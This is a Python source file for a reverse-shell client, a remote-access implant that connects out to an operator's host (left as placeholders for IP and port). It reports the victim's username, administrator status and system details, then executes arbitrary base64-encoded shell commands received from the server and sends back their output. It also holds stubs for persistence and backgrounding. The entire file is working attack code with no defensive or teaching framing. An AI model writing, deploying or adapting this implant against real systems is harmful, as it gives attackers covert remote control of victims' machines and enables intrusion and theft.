import base64
import platform
import socket
import subprocess
import os
import sys
import ctypes
import time


def inbound():
    print('[+] Awaiting response from server')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except socket.error as en:
            print(f'[-] Socket error: {en}')
            sock.close()
            break


def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf-8'))
    sock.send(response)


def session_handler():
    try:
        print(f'[+] Connecting to {host_ip}')
        sock.connect((host_ip, host_port))
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = f'{op_sys[0]} {op_sys[1]}'
        outbound(op_sys)
        print(f'[+] Connected to {host_ip}')
        while True:
            message = inbound()
            print(f'[+] Message received - {message}')
            if message == 'exit':
                print('[-] The server has terminated the session')
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to {cur_dir}')
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory . Try again.')
                    continue
            elif message == 'help':
                pass
            elif message == 'background':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = 'Input_IP_Here'
        host_port = 'Input_Port_here'
        session_handler()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host_ip> <host_port>')
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as e:
        print(e)
